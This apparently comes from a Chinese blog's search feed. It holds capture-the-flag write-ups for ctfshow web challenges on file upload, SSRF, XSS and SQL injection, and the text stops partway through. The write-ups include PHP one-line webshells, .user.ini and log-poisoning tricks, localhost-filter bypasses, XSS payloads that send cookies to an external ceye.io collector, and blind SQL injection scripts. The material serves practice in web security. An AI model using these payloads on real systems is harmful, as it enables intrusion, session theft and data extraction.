<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow_web入门（文件上传151—156）</title>
      <link href="/2023/01/23/ctfshow_web151~160/"/>
      <url>/2023/01/23/ctfshow_web151~160/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ctfshow-web入门（文件上传151—156）"><a href="#ctfshow-web入门（文件上传151—156）" class="headerlink" title="ctfshow_web入门（文件上传151—156）"></a>ctfshow_web入门（文件上传151—156）</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>前段检测类型，burp抓包修改文件即可</p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123153030864.png" alt="image-20230123153030864"></p><p>查看上级目录，发现可疑文件</p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123154134221.png" alt="image-20230123154134221"></p><p>查看flag.php内容，得到flag</p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123154243203.png" alt="image-20230123154243203"></p><p>web152一样</p><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>利用user.ini进行文件上传绕过</p><p>上传一个含有一句话木马的图片，再上传<code>.user.ini</code>内容为<code>auto_append_file=&quot;shell.png&quot;</code></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123155945931.png" alt="image-20230123155945931"></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123160012304.png" alt="image-20230123160012304"></p><p>user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以</p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123160443293.png" alt="image-20230123160443293"></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123160519408.png" alt="image-20230123160519408"></p><h2 id="web154-155"><a href="#web154-155" class="headerlink" title="web154-155"></a>web154-155</h2><p>对文件内容进行了过滤，过滤了php</p><p><code>&lt;?=eval($_POST[&#39;attack&#39;]);?&gt;</code></p><p>后面跟上题一样</p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123161944841.png" alt="image-20230123161944841"></p><h2 id="web156-158"><a href="#web156-158" class="headerlink" title="web156-158"></a>web156-158</h2><p>在前面的基础上，过滤了[],直接用{}代替</p><p><code>&lt;?=eval($_POST&#123;&#39;attack&#39;&#125;);?&gt;</code></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123162311924.png" alt="image-20230123162311924"></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123162400083.png" alt="image-20230123162400083"></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123162512161.png" alt="image-20230123162512161"></p><h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>过滤了括号，那用反引号就行，直接输出flag，反正知道flag在哪。。</p><?=`tac ../f*`?><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>过滤了php、执行函数、反引号等</p><p>利用日志包含绕过，木马图片内容<?=include"/var/lo"."g/nginx/access.lo"."g"?>因为log被过滤了。所以用拼接绕过</p><p>上传完.user.ini和木马图片后</p><p>访问网站然后修改ua头信息即可</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_web入门SSRF</title>
      <link href="/2023/01/22/ctfshow-webSSRF351~360/"/>
      <url>/2023/01/22/ctfshow-webSSRF351~360/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ctfshow-web入门SSRF"><a href="#ctfshow-web入门SSRF" class="headerlink" title="ctfshow_web入门SSRF"></a>ctfshow_web入门SSRF</h1><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/01/22/ctfshow-webSSRF351~360/image-20230122144739028.png" alt="image-20230122144739028"></p><p><img src="/2023/01/22/ctfshow-webSSRF351~360/image-20230122144817343.png" alt="image-20230122144817343"></p><h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用进制绕过，<a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/%EF%BC%8C%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2wangzhan">https://tool.520101.com/wangluo/jinzhizhuanhuan/，进制转换wangzhan</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">十六进制</span><br><span class="line">url=http://0x7F.0.0.1/flag.php</span><br><span class="line">八进制</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">10 进制整数格式</span><br><span class="line">url=http://2130706433/flag.php</span><br><span class="line">16 进制整数格式，还是上面那个网站转换记得前缀0x</span><br><span class="line">url=http://0x7F000001/flag.php</span><br><span class="line">还有一种特殊的省略模式</span><br><span class="line">127.0.0.1写成127.1</span><br></pre></td></tr></table></figure><p><img src="/2023/01/22/ctfshow-webSSRF351~360/image-20230122145638858.png" alt="image-20230122145638858"></p><p>353题也一样</p><h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><p>0和1都被过滤了，上面的都用不了。</p><p><code>url=http://r.rqfl57.ceye.io/flag.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将域名A类指向127.0.0.1</span><br><span class="line">http(s)://sudo.cc/指向127.0.0.1</span><br><span class="line">url=http://sudo.cc/flag.php</span><br><span class="line">也可以</span><br><span class="line">&lt;?php header(&quot;Location: http://127.0.0.1/flag.php&quot;);</span><br><span class="line"># POST: url=http://your-domain/ssrf.php</span><br></pre></td></tr></table></figure><h2 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h2><p><img src="/2023/01/22/ctfshow-webSSRF351~360/image-20230122152909932.png" alt="image-20230122152909932"></p><p>限制host位数小于5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure><p><img src="/2023/01/22/ctfshow-webSSRF351~360/image-20230122153049647.png" alt="image-20230122153049647"></p><h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><p><img src="/2023/01/22/ctfshow-webSSRF351~360/image-20230122153154103.png" alt="image-20230122153154103"></p><p>限制host位数小于3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br></pre></td></tr></table></figure><p><img src="/2023/01/22/ctfshow-webSSRF351~360/image-20230122153258298.png" alt="image-20230122153258298"></p><h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><p><img src="/2023/01/22/ctfshow-webSSRF351~360/image-20230122154939245.png" alt="image-20230122154939245"></p><p>ILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255)</p><p>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</p><p>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</p><p>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</p><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><p>题目：</p><p><img src="/2023/01/22/ctfshow-webSSRF351~360/image-20230122155659469.png" alt="image-20230122155659469"></p><p><img src="/2023/01/22/ctfshow-webSSRF351~360/image-20230122155821117.png" alt="image-20230122155821117"></p><p><code>url=http://ctf.@127.0.0.1/flag.php?.show</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_web入门（XSS316-333）</title>
      <link href="/2023/01/21/ctfshow_webXSS316~333/"/>
      <url>/2023/01/21/ctfshow_webXSS316~333/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ctfshow-web入门（XSS316-333）"><a href="#ctfshow-web入门（XSS316-333）" class="headerlink" title="ctfshow_web入门（XSS316-333）"></a>ctfshow_web入门（XSS316-333）</h1><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>首先测试一下<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，弹窗成功，第一题应该是没有任何的过滤，所以直接打cookie即可。</p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120174942937-1674286008372-1-1674286295495-2.png" alt="image-20230120174942937"></p><p>ctfshow%7B4c1b8648-a21f-4c11-9b3a-6b271854b062%7D</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p><a href="http://ceye.io/">CEYE - Monitor service for security testing</a></p><p>在这个网站上注册账号获得一个临时域名，rqfl57.ceye.io</p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120193601863-1674286014958-3.png" alt="image-20230120193601863"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://rqfl57.ceye.io/&#x27;+document.cookie)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120194114609-1674286025067-7.png" alt="image-20230120194114609"></p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120194146461-1674286020113-5.png" alt="image-20230120194146461"></p><p>web318、web319都可以用这个方法</p><h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><p>使用<body>方法没反应，好像过滤了空格，把空格换成&#x2F;**&#x2F;</body></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/onload=&quot;window.open(&#x27;http://rqfl57.ceye.io/&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120195110683-1674286033166-9.png" alt="image-20230120195110683"></p><p>web321—326也一样</p><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120200542603-1674286037912-11.png" alt="image-20230120200542603"></p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120200607062-1674286042918-13.png" alt="image-20230120200607062"></p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120200625276-1674286046934-15.png" alt="image-20230120200625276"></p><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册账户，将密码设置为：&lt;script&gt;window.open(&#x27;http://rqfl57.ceye.io/&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120201041962-1674286050755-17.png" alt="image-20230120201041962"></p><p>获得管理员cookie，F12，把cookie改成管理员的就好啦。</p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120201341837-1674286055155-19.png" alt="image-20230120201341837"></p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120201415999-1674286059594-21.png" alt="image-20230120201415999"></p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>使用与上题一样的方法后发现，cookie失效了，表格会出现在第一行的右侧，直接拿flag就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://rqfl57.ceye.io/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120204406537-1674286063683-23.png" alt="image-20230120204406537"></p><h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>和上题一样，就是位置变了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;//rqfl57.ceye.io/&#x27;+document.querySelector(&#x27;#top &gt; div.layui-container&#x27;).textContent)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120211520672-1674286067811-25.png" alt="image-20230120211520672"></p><h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><p>让admin自己修改自己密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120213131564-1674286074961-27.png" alt="image-20230120213131564"></p><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120213353090-1674286078923-29.png" alt="image-20230120213353090"></p><p>flag需要9999元，转负数的钱就能给自己加钱，所以给admin转-9999哈哈哈</p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120213537690-1674286085942-31.png" alt="image-20230120213537690"></p><h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>不能转负数了，但是可以给自己转钱</p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120214004808-1674286089330-33.png" alt="image-20230120214004808"></p><p>使用burp</p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120220322650-1674286093027-35.png" alt="image-20230120220322650"></p><p><img src="/2023/01/21/ctfshow_webXSS316~333/image-20230120220345095-1674286096614-37.png" alt="image-20230120220345095"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web入门-sql注入（184-189）</title>
      <link href="/2023/01/20/ctfshow-web184~189/"/>
      <url>/2023/01/20/ctfshow-web184~189/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ctfshow-web入门-sql注入（184-189）"><a href="#ctfshow-web入门-sql注入（184-189）" class="headerlink" title="ctfshow-web入门-sql注入（184-189）"></a>ctfshow-web入门-sql注入（184-189）</h1><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">查询结果</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39f3e9d8-f324-4ece-b110-e61502145f90.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span>  j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;i&#125;</span>,1)regexp(char(<span class="subst">&#123;j&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/01/20/ctfshow-web184~189/image-20230120162235003-1674206177170-1.png" alt="image-20230120162235003"></p><h2 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h2><p>过滤了<code>* 空格 % \u003C &gt; ^ # \\x23 数字 file = or | select and flag into where &amp; &#39; \&quot; union  sleep benchmark</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://11f96914-5603-40b2-b731-5adb83c228d1.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">strs = <span class="string">&#x27;&#123;qwertyuiopasdfghjklzxcvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_true</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;true+&quot;</span> * num).strip(<span class="string">&quot;+&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">all_true</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        res += <span class="string">&quot;chr(&quot;</span> + to_true(<span class="built_in">ord</span>(i)) + <span class="string">&quot;),&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res.strip(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;select concat(&quot;+all_true(&quot;c%&quot;)+&quot;);&quot;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like concat(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(all_true(flag + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="comment"># print(req.text)</span></span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/01/20/ctfshow-web184~189/image-20230120163445923.png" alt="image-20230120163445923"></p><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//只有admin可以获得flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>md5(“”,true),true原始16字符二进制格式，flase，32字符十六进制数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;129581926211651571912466741651878684928&quot;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;ffifdyop&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>,True);</span><br><span class="line"><span class="comment"># �T0D��o#��&#x27;or&#x27;8</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str2</span>,True);</span><br><span class="line"><span class="comment"># &#x27;or&#x27;6�]��!r,��b</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web188"><a href="#web188" class="headerlink" 